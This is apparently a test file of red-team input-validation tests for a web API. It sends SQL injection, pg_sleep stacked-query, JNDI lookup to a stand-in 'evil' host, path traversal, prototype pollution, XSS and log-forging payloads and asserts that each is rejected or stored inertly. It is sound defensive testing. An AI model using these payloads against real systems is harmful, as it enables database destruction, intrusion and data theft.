/**
 * Red-team tests for input handling: injection, malformed and hostile payloads.
 * Every response must be a deliberate 2xx/4xx, never a 5xx, and nothing hostile may be executed or stored raw
 * where it would be interpreted.
 */
import request from 'supertest';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';
import {
  addQuestion,
  buildWorld,
  cookieFor,
  makeApp,
  makeDb,
  resetDb,
  type World,
} from './helpers.js';

const db = makeDb();
const { app, lines } = makeApp(db);
let world: World;
beforeEach(async () => {
  await resetDb(db);
  world = await buildWorld(db);
});
afterAll(() => db.$disconnect());

const asAuthor = () => cookieFor(world.users.authorAcme.id);
const asAdmin = () => cookieFor(world.users.admin.id);
const search = (qs: string) => request(app).get(`/api/questions?${qs}`).set('Cookie', asAdmin());

describe('C1 search input: SQL / tsquery injection and hostile strings', () => {
  const payloads = [
    "'; DROP TABLE question; --",
    "' OR '1'='1",
    '"; SELECT pg_sleep(5); --',
    'a & b | !c :* <-> d',
    '!!!',
    '\\',
    '%',
    '_',
    '‮ RTL override',
    '😀'.repeat(50),
    'a'.repeat(200),
    '(((((',
    "O'Reilly",
    '${jndi:ldap://evil/x}',
    '../../etc/passwd',
  ];
  it.each(payloads)('q=%j is answered, never a 5xx, and the table survives', async (q) => {
    await addQuestion(db, world, {
      text: 'Plain question about queues',
      authorId: world.users.authorA.id,
    });
    const res = await search(`q=${encodeURIComponent(q)}`);
    expect(res.status).toBeLessThan(500);
    expect(await db.question.count()).toBe(1);
  });

  it('a NUL byte in the query is a clean 400, not a database error', async () => {
    const res = await search('q=abc%00def');
    expect(res.status).toBe(400);
  });

  it('a search that takes a deliberate sleep payload returns quickly (no stacked queries)', async () => {
    const t = Date.now();
    await search(`q=${encodeURIComponent("x'; SELECT pg_sleep(4); --")}`);
    expect(Date.now() - t).toBeLessThan(3000);
  });
});

describe('C2 query-string parameters', () => {
  it.each([
    'limit=0',
    'limit=-1',
    'limit=51',
    'limit=abc',
    'limit=1e3',
    'offset=-1',
    'offset=10001',
    'offset=1.5',
    'client=not-a-uuid',
    'client[]=x',
    'q=a&q=b',
    'status=APPROVED&status=PENDING',
    'status=DROP',
    'tags=a:b:c',
    'tags=UPPER:case',
    `tags=${Array.from({ length: 31 }, (_, i) => `technology:t${i}`).join(',')}`,
    'unknown=1',
    '__proto__[admin]=1',
    'constructor[prototype][x]=1',
  ])('%s is a 400 (strict query schema), never a 5xx', async (qs) => {
    const res = await search(qs);
    expect(res.status).toBeLessThan(500);
    expect(res.status).toBeGreaterThanOrEqual(400);
  });

  it('valid boundary values still work', async () => {
    expect((await search('limit=50&offset=0')).status).toBe(200);
    expect((await search('limit=1&offset=10000')).status).toBe(200);
  });
});

describe('C3 request bodies', () => {
  const post = (body: string | object, type = 'application/json') =>
    request(app)
      .post('/api/questions')
      .set('Cookie', asAuthor())
      .set('Content-Type', type)
      .send(body as string);

  it('NUL bytes in text fields are rejected (Postgres cannot store them)', async () => {
    expect((await post({ text: 'abc\u0000def' })).status).toBe(400);
    expect((await post({ text: 'ok', answerNotes: 'a\u0000b' })).status).toBe(400);
  });

  it.each([
    ['not json at all', '{{{'],
    ['empty body', ''],
    ['a JSON array', '[]'],
    ['a JSON string', '"x"'],
    ['null', 'null'],
    ['prototype pollution', '{"text":"ok","__proto__":{"admin":true}}'],
    ['constructor pollution', '{"text":"ok","constructor":{"prototype":{"admin":true}}}'],
    ['deep nesting', `{"text":"ok","x":${'['.repeat(2000)}${']'.repeat(2000)}}`],
    ['huge number', '{"text":"ok","tags":[1e999]}'],
    ['duplicate keys', '{"text":"a","text":"b"}'],
  ])('%s never crashes the server', async (_name, body) => {
    const res = await post(body);
    expect(res.status).toBeLessThan(500);
    // the server is still alive and Object.prototype untouched
    expect(({} as Record<string, unknown>).admin).toBeUndefined();
    expect((await request(app).get('/api/health')).status).toBe(200);
  });

  it('a body over the 100 kB limit is a 413, and the wrong content-type is not parsed as JSON', async () => {
    const big = JSON.stringify({ text: 'x', answerNotes: 'y'.repeat(120_000) });
    expect((await post(big)).status).toBe(413);
    const form = await post('text=hello', 'application/x-www-form-urlencoded');
    expect(form.status).toBe(400); // body not parsed, so validation fails
    const plain = await post('{"text":"hello"}', 'text/plain');
    expect(plain.status).toBe(400);
  });

  it('a 1001-character question and 10,001-character notes are rejected, the limits are exact', async () => {
    expect((await post({ text: 'q'.repeat(1001) })).status).toBe(400);
    expect((await post({ text: 'q'.repeat(1000) })).status).toBe(201);
    expect((await post({ text: 'ok again', answerNotes: 'n'.repeat(10_001) })).status).toBe(400);
  });

  it('tags must look like category:value and be known; 31 is too many', async () => {
    for (const tags of [
      ['technology:nope'],
      ['bogus:react'],
      ['TECH:react'],
      ['a'],
      [''],
      Array(31).fill('technology:react'),
    ]) {
      expect((await post({ text: 'Tag probe question', tags })).status).toBe(400);
    }
  });

  it('hostile admin payloads are validated: emails, names, passwords, ids', async () => {
    const admin = (path: string, body: object) =>
      request(app).post(path).set('Cookie', asAdmin()).send(body);
    const base = { email: 'new@test.dev', name: 'New', password: 'long-enough-pw', role: 'USER' };
    for (const bad of [
      { ...base, email: 'nope' },
      { ...base, email: `${'a'.repeat(250)}@t.dev` },
      { ...base, name: '' },
      { ...base, name: 'n'.repeat(101) },
      { ...base, password: 'short' },
      { ...base, password: 'p'.repeat(201) },
      { ...base, role: 'SUPERUSER' },
      { ...base, clientIds: ['not-a-uuid'] },
      { ...base, clientIds: Array(101).fill('11111111-1111-4111-8111-111111111111') },
    ]) {
      expect((await admin('/api/admin/users', bad)).status, JSON.stringify(bad)).toBe(400);
    }
    for (const label of ['', ' ', '+++', 'l'.repeat(51)]) {
      expect(
        (await admin(`/api/admin/clients/${world.acme.id}/technologies`, { label })).status,
      ).toBe(400);
    }
  });
});

describe('C4 stored content is returned as data, never as markup', () => {
  const xss = '<img src=x onerror=alert(1)><script>alert(2)</script>';

  it('the API stores text verbatim, serves JSON with nosniff, and never as HTML', async () => {
    const created = await request(app)
      .post('/api/questions')
      .set('Cookie', asAuthor())
      .send({ text: xss, answerNotes: xss });
    expect(created.status).toBe(201);
    const res = await request(app)
      .get(`/api/questions/${created.body.question.id}`)
      .set('Cookie', asAdmin());
    expect(res.headers['content-type']).toMatch(/^application\/json/);
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.body.question.text).toBe(xss);
  });

  it('log lines cannot be forged with newlines or escape codes in user input', async () => {
    lines.length = 0;
    await request(app)
      .get(`/api/questions?q=${encodeURIComponent('x\n{"level":60,"msg":"FORGED"}\u001b[31m')}`)
      .set('Cookie', asAdmin());
    await request(app)
      .post('/api/auth/login')
      .send({ email: 'nobody@test.dev', password: 'x\n{"level":60,"msg":"FORGED"}' });
    for (const l of lines) {
      // every captured line is exactly one JSON document
      expect(() => JSON.parse(l)).not.toThrow();
      expect(l.trimEnd().split('\n')).toHaveLength(1);
    }
    expect(lines.some((l) => JSON.parse(l).msg === 'FORGED')).toBe(false);
  });
});
